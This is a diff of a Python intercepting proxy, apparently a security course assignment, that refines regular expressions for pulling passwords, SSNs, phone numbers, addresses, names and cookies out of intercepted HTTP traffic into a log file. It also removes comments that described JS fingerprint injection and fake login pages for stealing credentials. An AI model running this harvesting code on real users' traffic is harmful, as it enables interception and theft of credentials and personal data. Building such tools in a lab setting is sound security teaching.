@@ -30,22 +30,16 @@ def get_args():
     args = parser.parse_args()
 
 
-# In addition to forwarding packets it should look for info in the packets and log them in info_1.txt, so append
-# The info to look for are
-# Username/emails and passwords in query params or in forms
-# Credit card numbers or SSN
-# Cookies in the HTTP request
-
-
-# HINT: use regex to capture nuances of different format types, look both at req and res packets
-# HINT: info can be passed in the URL and headers too
-
-
 def test_patterns(query_string, patterns: dict[str, re.Pattern]):
     results = {}
     for key, pattern in patterns.items():
-        match = pattern.search(query_string)
-        results[key] = match.group(1) if match else None
+        matches = pattern.findall(query_string)
+        if len(matches) == 1:
+            if matches[0] == "":
+                results[key] = None
+                continue
+            
+        results[key] = matches
     return results
 
 
@@ -57,9 +51,12 @@ def passive(data: str, url: str):
         "state": re.compile(r"(?:state|province|region|st)=(.*?)(?:&|$)"),
         "city": re.compile(r"\bcity=(.*?)(?:&|$)"),
         "phone_param": re.compile(r"(?:phone|telephone|mobile)=(.*?)(?:&|$)"),
-        "phone": re.compile(r"\b((\(\d{3}\)\s?|\d{3}[-.\s])?\d{3}[-.\s]\d{4})\b"),
+        "phone": re.compile(r"\b(\d{3}[-.\s]?\d{3}[-.\s]\d{4})\b"),
         "ssn": re.compile(r"(?:ssn|social|security|social-security)=(.*?)(?:&|$)"),
-        "address": re.compile(r"(?:address|addr)=(.*?)(?:&|$)"),
+        "address_param": re.compile(r"(?:address|addr)=(.*?)(?:&|$)"),
+        "address": re.compile(
+            r"\b(\d+\s[A-Z][a-zA-Z\s]+,?\s[A-Z]{2}\s\d{5}(-\d{4})?)\b"
+        ),
         "birthday": re.compile(r"(?:birthday|bday)=(.*?)(?:&|$)"),
         "last": re.compile(r"(?:last|surname|lastname|lname)=(.*?)(?:&|$)"),
         "first": re.compile(r"(?:first|firstname|fname)=(.*?)(?:&|$)"),
@@ -72,14 +69,11 @@ def passive(data: str, url: str):
             r"(?:ssn|social|security|social-security)=(.*?)(?:&|$)"
         ),
         "name": re.compile(r"\b([A-Z][a-z]+ [A-Z][a-z]+)\b"),
-        "address": re.compile(
-            r"\b(\d+\s[A-Z][a-zA-Z\s]+,?\s[A-Z]{2}\s\d{5}(-\d{4})?)\b"
-        ),
         "cookie": re.compile(r"(?:Cookie|Set-Cookie):\s?(.*)"),
     }
 
     # Test the patterns
-    results = test_patterns(data, patterns)
+    results = test_patterns(unquote(data), patterns)
 
     # Print the results
     with file_lock:
@@ -88,23 +82,11 @@ def passive(data: str, url: str):
 
             for key, value in results.items():
                 if value:
-                    f.write(f"{key}: {value}\n")
+                    f.write(f"{key}: {', '.join(value)}\n")
 
             f.write("\n")
 
 
-# In addition to forwarding packets it should inject JS code that should perform fingerprinting on the cient
-# Info to gather: user agent, screen resolution, language
-# Those info should be then sent back to the proxy with a GET request using:
-# http://proxy ip address/?user-agent=USER AGENT&screen=SCREEN RES&lang=LANGUAGE
-# On receive those info should be parsed and logged in info_2.txt
-
-# HINT: For user-agent and language look into JS navigator module
-# HINT: For screen resolution look into JS window module
-# HINT: To send the strings as query param they must be encoded correctly
-
-
-# Also for predefined domains a fake login page should be used to capture credentials ie. user search example.com
 def active(body: str) -> str:
     global args
 
@@ -470,6 +452,8 @@ def handle_client(client_sock: socket, passive_mode: bool):
 
             if body_length > 0:
                 body = get_body(proxy_socket, body_length, body)
+
+            proxy_socket.close()
 
             body, encoding = decode_body(headers, body)
 
